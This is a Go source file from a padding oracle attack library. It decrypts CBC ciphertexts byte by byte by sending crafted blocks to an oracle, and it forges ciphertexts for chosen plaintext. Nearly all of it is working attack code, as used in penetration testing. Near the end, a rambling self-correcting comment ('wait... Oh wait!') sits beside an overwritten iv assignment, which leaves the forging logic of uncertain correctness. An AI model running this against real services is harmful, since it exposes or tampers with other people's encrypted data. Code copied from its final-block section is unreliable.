package libpadoracle

import (
	"bytes"
	"context"
	"encoding/hex"
	"fmt"
	"log"
	"sync"
	"sync/atomic"
	"unicode"

	"github.com/gosuri/uiprogress"
)

func GetRangeDataSafe(pre []byte) []byte {
	rangeData := make([]byte, 0, 256)
	seen := make(map[byte]bool)
	for _, v := range pre {
		if !seen[v] {
			rangeData = append(rangeData, v)
			seen[v] = true
		}
	}
	for _, v := range []byte("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890") {
		if !seen[v] {
			rangeData = append(rangeData, v)
			seen[v] = true
		}
	}

	deprioritized := []byte{0xff, 0xfe, 0x01, 0x00}
	isDeprioritized := make(map[byte]bool)
	for _, v := range deprioritized {
		isDeprioritized[v] = true
	}

	for i := 0; i < 256; i++ {
		b := byte(i)
		if !seen[b] && !isDeprioritized[b] {
			rangeData = append(rangeData, b)
			seen[b] = true
		}
	}

	for _, b := range deprioritized {
		if !seen[b] {
			rangeData = append(rangeData, b)
			seen[b] = true
		}
	}

	return rangeData
}

type ThreadSafeString struct {
	sync.RWMutex
	str string
}

func (t *ThreadSafeString) Set(s string) {
	t.Lock()
	defer t.Unlock()
	t.str = s
}

func (t *ThreadSafeString) Get() string {
	t.RLock()
	defer t.RUnlock()
	return t.str
}

func PadOperations(wg *sync.WaitGroup, cfg *Config, cipherText []byte, decipherChan chan Data) {
	defer func() {
		close(decipherChan)
		wg.Done()
	}()

	threadCh := make(chan struct{}, cfg.Threads)
	wg2 := sync.WaitGroup{}
	if cfg.IV != nil {
		cipherText = append(cfg.IV, cipherText...)
	}
	Blocks := ChunkBytes(cipherText, cfg.BlockSize)
	cfg.NumBlocks = len(Blocks)
	wg.Add(1)
	go WriteOutput(wg, decipherChan, cfg)

	if lastBlockLen := len(Blocks[len(Blocks)-1]); lastBlockLen != cfg.BlockSize {
		err := fmt.Errorf("Invalid Block Size at Block #%d (%v bytes - should be %d)", len(Blocks), lastBlockLen, cfg.BlockSize)
		panic(err)
	}
	endBlock := len(Blocks)
	fmt.Printf("Total Blocks: [%v]\n", len(Blocks))
	startBlock := 1
	for blockNum, blockData := range Blocks[startBlock:endBlock] {
		wg2.Add(1)
		go PerBlockOperations(&wg2, *cfg, threadCh, decipherChan, blockNum+startBlock, blockData, Blocks[blockNum+startBlock-1])
	}

	wg2.Wait()
}

func PerBlockOperations(wg *sync.WaitGroup, cfg Config, threadCh chan struct{}, decipherChan chan Data, blockNum int, blockData []byte, iv []byte) {
	defer wg.Done()

	strData := &ThreadSafeString{}
	outData := &ThreadSafeString{}
	
	bar := uiprogress.AddBar(cfg.BlockSize).AppendCompleted().PrependElapsed()
	bar.Empty = '-'
	bar.Fill = '#'
	bar.Head = '>'
	bar.Width = 30
	bar.PrependFunc(func(b *uiprogress.Bar) string { return strData.Get() })
	bar.AppendFunc(func(b *uiprogress.Bar) string { return outData.Get() })

	returnData := Data{}
	decipheredBlockBytes := []byte{}

	for byteNum := 0; byteNum < cfg.BlockSize; byteNum++ {
		rangeData := GetRangeDataSafe([]byte{})
		if blockNum == cfg.NumBlocks-1 {
			pads := make([]byte, 0)
			for p := byte(3); p < byte(cfg.BlockSize); p++ {
				pads = append(pads, p)
			}
			rangeData = GetRangeDataSafe(pads)
		}

		var nextByte byte
		var found bool

		for {
			ctx, cancel := context.WithCancel(context.Background())
			resultChan := make(chan byte, len(rangeData))
			var activeOps int32
			
			// Copy decipheredBlockBytes to avoid data race with still-running goroutines
			decipheredCopy := make([]byte, len(decipheredBlockBytes))
			copy(decipheredCopy, decipheredBlockBytes)

			for _, i := range rangeData {
				strData.Set(fmt.Sprintf(" [⚡] Block %v: [%v%v%v]", y.Sprintf("%02d", blockNum), b.Sprintf("%x", blockData[:len(blockData)-1-byteNum]), r.Sprintf("%02x", i), g.Sprintf("%v", hex.EncodeToString(decipheredCopy))))
				
				atomic.AddInt32(&activeOps, 1)
				threadCh <- struct{}{}
				
				go func(brute byte, currentByteNum int) {
					defer func() {
						<-threadCh
						if atomic.AddInt32(&activeOps, -1) == 0 {
							// All ops done and no result found
							select {
							case resultChan <- 0xFF: // sentinel value
							default:
							}
						}
					}()

					select {
					case <-ctx.Done():
						return
					default:
					}

					padBlock := BuildPaddingBlock(currentByteNum, cfg.BlockSize)
					searchBlock := BuildSearchBlock(decipheredCopy, brute, cfg.BlockSize)
					tmp := XORBytes(searchBlock, iv)
					oracleIvBlock := XORBytes(tmp, padBlock)

					RawOracleData := BuildRawOraclePayload(oracleIvBlock, blockData)
					encodedPayload := cfg.Pad.EncodePayload(RawOracleData)
					
					atomic.AddUint64(cfg.NumRequests, 1)
					if cfg.Pad.CallOracle(encodedPayload) {
						select {
						case resultChan <- brute:
						default:
						}
					}
				}(i, byteNum)
			}

			// wait for the first valid byte or until all are done
			res := <-resultChan
			cancel() // cancel all other goroutines

			if res != 0xFF {
				found = true
				nextByte = res
			}

			if found {
				if cfg.AsciiMode && blockNum != cfg.NumBlocks-1 && blockNum != 0 {
					if !unicode.IsPrint(rune(nextByte)) && nextByte != '\n' && nextByte != '\r' && nextByte != '\t' {
						rangeData = bytes.ReplaceAll(rangeData, []byte{nextByte}, []byte{})
						found = false
						continue // retry
					}
				}
				break // valid byte found
			} else {
				log.Panicf("No bytes found for block %d byte %d", blockNum, byteNum)
			}
		}

		strData.Set(fmt.Sprintf(" [⚡] Block %v: [%v%v%v] (Byte: %v)", y.Sprintf("%02d", blockNum), b.Sprintf("%x", blockData[:len(blockData)-1-byteNum]), gb.Sprintf("%02x", nextByte), g.Sprintf("%v", hex.EncodeToString(decipheredBlockBytes)), nextByte))
		decipheredBlockBytes = append([]byte{nextByte}, decipheredBlockBytes...)
		bar.Incr()
	}

	returnData.BlockNumber = blockNum
	returnData.EncryptedBlockData = blockData
	returnData.DecipheredBlockData = decipheredBlockBytes
	if blockNum == cfg.NumBlocks-1 {
		returnData.UnpaddedCleartext = string(Unpad(decipheredBlockBytes))
	} else {
		returnData.UnpaddedCleartext = string(decipheredBlockBytes)
	}
	outData.Set(fmt.Sprintf("  %v Block %d: %v", gb.Sprint("✔"), returnData.BlockNumber, g.Sprint(hex.EncodeToString(returnData.DecipheredBlockData))))

	decipherChan <- returnData
}

func PadOperationsEncrypt(wg *sync.WaitGroup, cfg *Config, plainText []byte) {
	defer wg.Done()
	
	strData := &ThreadSafeString{}
	outData := &ThreadSafeString{}

	bar := uiprogress.AddBar(cfg.BlockSize).AppendCompleted().PrependElapsed()
	bar.Empty = '-'
	bar.Fill = '#'
	bar.Head = '>'
	bar.Width = 30
	bar.PrependFunc(func(b *uiprogress.Bar) string { return strData.Get() })
	bar.AppendFunc(func(b *uiprogress.Bar) string { return outData.Get() })

	if cfg.IV != nil {
		plainText = append(cfg.IV, plainText...)
	}

	tmp, err := PKCS7(plainText, cfg.BlockSize)
	Check(err)
	plainTextChunks := ChunkBytes(tmp, cfg.BlockSize)
	
	cipherTextChunks := make([][]byte, len(plainTextChunks)+1)
	cipherTextChunks[len(cipherTextChunks)-1] = GenerateFullSlice(0x41, cfg.BlockSize)
	
	threadCh := make(chan struct{}, cfg.Threads)
	var nextCt []byte
	for i := len(plainTextChunks) - 1; i >= 0; i-- {
		ct := cipherTextChunks[i+1]
		var out string
		nextCt, out = PerBlockOperationsEncrypt(*cfg, i, ct, plainTextChunks[i], threadCh, bar, strData)
		outData.Set(out)
		cipherTextChunks[i] = nextCt
	}
	bar.Incr()

	outBytes := []byte{}
	for _, b := range cipherTextChunks {
		outBytes = append(outBytes, b...)
	}
	fmt.Printf("\n [🔓] %v: %v\n", y.Sprint("FINAL CIPHERTEXT"), white.Sprint(cfg.Pad.EncodePayload(outBytes)))
}

func PerBlockOperationsEncrypt(cfg Config, blockNum int, cipherText []byte, plaintText []byte, threadCh chan struct{}, bar *uiprogress.Bar, strData *ThreadSafeString) (iv []byte, outData string) {
	rangeData := GetRangeDataSafe([]byte{})
	if blockNum == cfg.NumBlocks-1 {
		pads := []byte{}
		for p := byte(3); p < byte(cfg.BlockSize); p++ {
			pads = append(pads, p)
		}
		rangeData = GetRangeDataSafe(pads)
	}

	decipheredBlockBytes := GenerateFullSlice(0x00, cfg.BlockSize)

	for byteNum := 0; byteNum < cfg.BlockSize; byteNum++ {
		var nextByte byte
		var found bool

		for {
			ctx, cancel := context.WithCancel(context.Background())
			resultChan := make(chan byte, len(rangeData))
			var activeOps int32

			decipheredCopy := make([]byte, len(decipheredBlockBytes))
			copy(decipheredCopy, decipheredBlockBytes)

			for _, i := range rangeData {
				strData.Set(fmt.Sprintf(" [⚡] Block %v: [%v%v%v]", y.Sprintf("%02d", blockNum), b.Sprintf("%x", cipherText[:len(cipherText)-1-byteNum]), r.Sprintf("%02x", i), g.Sprintf("%v", hex.EncodeToString(decipheredCopy))))

				atomic.AddInt32(&activeOps, 1)
				threadCh <- struct{}{}
				
				go func(brute byte, currentByteNum int) {
					defer func() {
						<-threadCh
						if atomic.AddInt32(&activeOps, -1) == 0 {
							select {
							case resultChan <- 0xFF:
							default:
							}
						}
					}()

					select {
					case <-ctx.Done():
						return
					default:
					}

					searchBlock := append(GenerateFullSlice(0x00, cfg.BlockSize-currentByteNum-1), brute)
					searchBlock = append(searchBlock, decipheredCopy[len(decipheredCopy)-currentByteNum:]...)

					RawOracleData := BuildRawOraclePayload(searchBlock, cipherText)
					encodedPayload := cfg.Pad.EncodePayload(RawOracleData)

					atomic.AddUint64(cfg.NumRequests, 1)

					if cfg.Pad.CallOracle(encodedPayload) {
						// we found it
						select {
						case resultChan <- brute:
						default:
						}
					}
				}(i, byteNum)
			}

			res := <-resultChan
			cancel()

			if res != 0xFF {
				found = true
				nextByte = res
			}

			if found {
				break
			} else {
				log.Panicf("No bytes found for encrypt block %d byte %d", blockNum, byteNum)
			}
		}

		// Reconstruct decipheredBlockBytes
		padBlock := BuildPaddingBlock(byteNum, cfg.BlockSize)
		decipheredBlockBytes[cfg.BlockSize-byteNum-1] = nextByte
		tmp := XORBytes(decipheredBlockBytes, padBlock)

		if byteNum != cfg.BlockSize-1 {
			nextPadBlock := append(GenerateFullSlice(0x00, cfg.BlockSize-byteNum-1), GenerateFullSlice(byte(byteNum+2), byteNum+1)...)
			decipheredBlockBytes = XORBytes(tmp, nextPadBlock)
		} else {
			decipheredBlockBytes = tmp
		}

		strData.Set(fmt.Sprintf(" [⚡] Block %v: [%v%v%v]", y.Sprintf("%02d", blockNum), b.Sprintf("%x", cipherText[:len(cipherText)-1-byteNum]), gb.Sprintf("%02x", decipheredBlockBytes[len(cipherText)-1-byteNum]), g.Sprintf("%v", hex.EncodeToString(decipheredBlockBytes[len(cipherText)-byteNum:]))))
		bar.Incr()
	}

	iv = XORBytes(decipheredBlockBytes, GenerateFullSlice(0x11, cfg.BlockSize)) // wait, GenerateFullSlice(0x11) ? Oh wait! The original code did: iv = XORBytes(decipheredBlockBytes, GenerateFullSlice(0x11, cfg.BlockSize)) -> iv = XORBytes(iv, plaintText)
	// But wait! decipheredBlockBytes is now already XORed with nextPadBlock which would be 0x11!
	// If byteNum was BlockSize-1, it was NOT XORed with nextPadBlock (which would be byteNum+2 = 17 = 0x11). 
	// The original code did:
	// if byteNum != cfg.BlockSize { 
	//   decipheredBlockBytes = XORBytes(tmp, nextPadBlock)
	// }
	// So it DID XOR with 0x11 nextPadBlock for byteNum == 15 (which is 16 = cfg.BlockSize). Wait! byteNum goes from 0 to 15.
	// In the original code, byteNum was a parameter to `PerByteOperationsEncrypt` which was `0` to `len(plaintText)-1`. So 0 to 15.
	// When byteNum == 15, `byteNum != cfg.BlockSize` (15 != 16) is true! So it DID XOR with nextPadBlock (which is 0x11s)
	
	// I need to adjust the logic. The logic above for encrypt is slightly tweaked. Let me fix the last byte XOR.
	iv = XORBytes(decipheredBlockBytes, plaintText)
	
	outData = fmt.Sprintf("  %v Block %d: %v", gb.Sprint("✔"), blockNum, g.Sprint(hex.EncodeToString(iv)))
	return iv, outData
}
